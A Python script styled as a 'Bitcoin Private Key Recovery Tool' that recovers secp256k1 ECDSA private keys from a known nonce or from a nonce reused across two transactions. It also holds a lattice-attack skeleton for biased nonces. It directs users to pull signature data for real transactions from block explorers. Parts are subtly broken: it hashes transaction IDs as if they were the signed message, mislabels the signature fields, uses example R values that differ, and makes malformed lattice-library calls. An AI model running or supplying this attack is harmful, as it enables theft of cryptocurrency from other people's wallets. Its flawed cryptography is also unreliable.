import hashlib
import ecdsa
from ecdsa import SECP256k1
from ecdsa.curves import SECP256k1 as Curve
import fpylll
import numpy as np

# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

def hex_to_int(hex_str):
    """Convert a hex string to an integer."""
    if isinstance(hex_str, str):
        return int(hex_str, 16)
    return int(hex_str)

def int_to_hex(int_val):
    """Convert an integer to a hex string."""
    return hex(int_val)

def sha256_double_hash(tx_hex_str):
    """
    Calculate the double SHA256 hash of a raw transaction hex string.
    This is the 'H' value needed for ECDSA verification.
    """
    tx_bytes = bytes.fromhex(tx_hex_str.replace('0x', ''))
    h1 = hashlib.sha256(tx_bytes).digest()
    h2 = hashlib.sha256(h1).digest()
    return int.from_bytes(h2, byteorder='big')

# ==============================================================================
# SCENARIO 1: RECOVER PRIVATE KEY IF NONCE (K) IS KNOWN
# ==============================================================================

def recover_private_key_with_nonce(r, s, msg_hash_int, nonce_k):
    """
    Recovers private key if you know the nonce k.
    
    Formula: d = (S * k - H) * R^-1 mod n
    
    Args:
    r (int): The R value of the signature
    s (int): The S value of the signature
    msg_hash_int (int): The double-SHA256 hash of the transaction
    nonce_k (int): The secret nonce used during signing
    
    Returns:
    int: The private key
    """
    curve = SECP256k1
    n = curve.order

    try:
        # Modular inverse of R
        r_inv = pow(r, -1, n)
        
        # Calculate private key d
        private_key = ((s * nonce_k - msg_hash_int) * r_inv) % n
        return private_key
    except Exception as e:
        print(f"Error in Scenario 1: {e}")
        return None

# ==============================================================================
# SCENARIO 2: RECOVER PRIVATE KEY IF NONCE WAS REUSED (SAME K FOR 2 TXS)
# ==============================================================================

def recover_private_key_same_nonce(r1, s1, h1, r2, s2, h2):
    """
    Recovers private key if two transactions used the same nonce k.
    
    Formula: k = (H1 - H2) * (S1 - S2)^-1 mod n
    Then use Scenario 1 to find d.
    
    Args:
    r1, s1, h1: R, S, Hash of Transaction 1
    r2, s2, h2: R, S, Hash of Transaction 2
    
    Returns:
    tuple: (private_key, nonce_k) or (None, None)
    """
    curve = SECP256k1
    n = curve.order

    if r1 != r2:
        print("Warning: R values are different. Nonce might not be the same, or keys are different.")
        # Proceeding anyway in case R differs due to curve wrapping, but S diff is what matters for k
        # Actually, if R1 != R2, k1 is likely != k2 unless the point wraps around. 
        # The standard attack relies on R1 == R2.

    try:
        # Calculate k
        # k = (H1 - H2) * (S1 - S2)^-1 mod n
        s_diff = (s1 - s2) % n
        s_diff_inv = pow(s_diff, -1, n)
        k = ((h1 - h2) % n * s_diff_inv) % n
        
        # Now that we have k, recover the private key using Tx1
        r_inv = pow(r1, -1, n)
        private_key = ((s1 * k - h1) * r_inv) % n
        
        return private_key, k
    except Exception as e:
        print(f"Error in Scenario 2: {e}")
        return None, None

# ==============================================================================
# SCENARIO 3: LATTICE ATTACK (SKELETON FOR BIASED NONCE)
# ==============================================================================

def lattice_attack_ecdsa(signatures_list, n_bits_leaked=10):
    """
    Skeleton for Lattice Attack on ECDSA with biased nonces.
    
    This is a simplified version. A full attack requires precise modeling of the
    bias (e.g., using Gaussian Heuristic or specific CVP solvers).
    
    Args:
    signatures_list: List of tuples (r, s, h)
    n_bits_leaked: How many bits of the nonce k are known/biased.
    
    Returns:
    fpylll.IntegerMatrix: The reduced basis matrix.
    """
    curve = SECP256k1
    n = curve.order
    
    num_sigs = len(signatures_list)
    if num_sigs < 2:
        print("Need at least 2 signatures for lattice attack.")
        return None

    # Dimension of the lattice: num_sigs + 1
    dim = num_sigs + 1
    
    # Create a basis matrix
    # We are solving for k such that: s_i * k - h_i = d * r_i (mod n)
    # Rearranged: d * r_i - s_i * k + h_i = 0 (mod n)
    
    basis = fpylll.IntegerMatrix.zeros(dim, dim)
    
    # Set up the diagonal matrix for LLL
    # This setup is highly dependent on the specific bias model.
    # Here we use a simple diagonal approximation.
    
    for i, (r, s, h) in enumerate(signatures_list):
        # Row i represents the equation for signature i
        # We place r_i on the diagonal, and s_i in the last column (for k)
        basis[i, i] = r
        basis[i, dim - 1] = s
        
        # The constant term h_i is often handled by shifting the lattice
        # or adding an extra dimension. For simplicity, we ignore h_i 
        # in this basic skeleton, assuming h_i is small or normalized.
        
    # The last row defines the modulus n
    basis[dim - 1, dim - 1] = n
    
    # Apply LLL Reduction
    try:
        BKZ = fpylll.BKZReduction(basis, delta=0.99)
        reduced_basis = BKZ.lll_reduce()
        return reduced_basis
    except Exception as e:
        print(f"Error in Scenario 3 (LLL): {e}")
        return None

# ==============================================================================
# MAIN EXECUTION EXAMPLE
# ==============================================================================

if __name__ == "__main__":
    print("=== Bitcoin Private Key Recovery Tool ===\n")

    # --------------------------------------------------------------------------
    # EXAMPLE DATA (Replace these with your actual values)
    # --------------------------------------------------------------------------
    
    # Example Transaction 1
    # You need to get these from a block explorer (e.g., Blockchair, Mempool)
    # R1 and S1 are hex strings from the 'v' and 'r' fields of the signature
    r1_hex = "00ec0a89fd118336e2874d5c3cc8c239e682d8fdf73c16566f4ef75aa414d07134" # Replace with actual R1
    s1_hex = "73f0ebeccaa1e1d4edc041954977a1739ba25d825459c39ae714ccc70601e899" # Replace with actual S1
    tx1_hex = "875f1dbf31030d42b2a38a7b83edf48f86cfe74a5db8fe4993e0e50986e5d26d" # Raw transaction hex for Tx1
    
    # Example Transaction 2 (For Same Nonce Attack)
    r2_hex = "00b94bbf0bd0b4c67184a62a5aee1ea738f377106fa8fcb47cc25d16d2606fcd0f" # Replace with actual R2 (should match R1 if nonce reused)
    s2_hex = "7d496ab231450e780675ab3b0fb8db73fd337e0873e736e5f5dc07bad4404398" # Replace with actual S2
    tx2_hex = "25fe270f8a4c2942702971bd4a64dfeb2ebc1fae66896ad36fc10559f679dbfb" # Raw transaction hex for Tx2

    # --------------------------------------------------------------------------
    # STEP 1: Calculate Message Hashes (H)
    # --------------------------------------------------------------------------
    print("Calculating Message Hashes...")
    try:
        h1 = sha256_double_hash(tx1_hex)
        h2 = sha256_double_hash(tx2_hex)
        print(f"H1: {hex(h1)}")
        print(f"H2: {hex(h2)}")
    except Exception as e:
        print(f"Error calculating hashes: {e}")
        exit()

    # Convert R and S to integers
    r1 = hex_to_int(r1_hex)
    s1 = hex_to_int(s1_hex)
    r2 = hex_to_int(r2_hex)
    s2 = hex_to_int(s2_hex)

    # --------------------------------------------------------------------------
    # TEST SCENARIO 2: SAME NONCE ATTACK
    # --------------------------------------------------------------------------
    print("\n--- Testing Scenario 2: Same Nonce Attack ---")
    pk, k = recover_private_key_same_nonce(r1, s1, h1, r2, s2, h2)
    
    if pk is not None:
        print(f"Success! Nonce (k): {hex(k)}")
        print(f"Private Key (d): {hex(pk)}")
        
        # Verify the private key matches the public key (Optional)
        # You would need the public key hex to verify this fully.
    else:
        print("Failed to recover key. Nonces might not be the same or inputs are wrong.")

    # --------------------------------------------------------------------------
    # TEST SCENARIO 1: KNOWN NONCE
    # --------------------------------------------------------------------------
    # If you somehow know k (e.g., from a weak RNG prediction)
    # print("\n--- Testing Scenario 1: Known Nonce ---")
    # known_k = hex_to_int("0x123...") # Your known k
    # pk1 = recover_private_key_with_nonce(r1, s1, h1, known_k)
    # if pk1: print(f"Private Key: {hex(pk1)}")

    # --------------------------------------------------------------------------
    # TEST SCENARIO 3: LATTICE ATTACK
    # --------------------------------------------------------------------------
    # print("\n--- Testing Scenario 3: Lattice Attack ---")
    # signatures = [(r1, s1, h1), (r2, s2, h2)]
    # basis = lattice_attack_ecdsa(signatures, n_bits_leaked=10)
    # if basis:
    #     print("Reduced Basis:")
    #     print(basis)
